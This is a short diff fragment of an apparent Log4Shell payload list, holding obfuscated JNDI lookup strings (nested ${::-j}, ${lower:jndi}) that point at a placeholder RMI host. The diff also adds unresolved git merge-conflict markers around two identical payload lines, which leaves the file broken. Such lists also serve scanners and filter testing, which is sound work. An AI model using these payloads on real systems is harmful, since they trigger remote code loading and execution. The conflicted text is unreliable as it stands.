@@ -41,4 +41,8 @@ ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://hostname}
 ${${::-j}ndi:rmi://hostname}
 ${jndi:rmi://hostname}
 ${${lower:jndi}:${lower:rmi}://hostname}
+<<<<<<< HEAD
 ${${lower:${lower:jndi}}:${lower:rmi}://hostname}
+=======
+${${lower:${lower:jndi}}:${lower:rmi}://hostname}
+>>>>>>> d40941577243d21fe5c26924a46d69113d88df8e
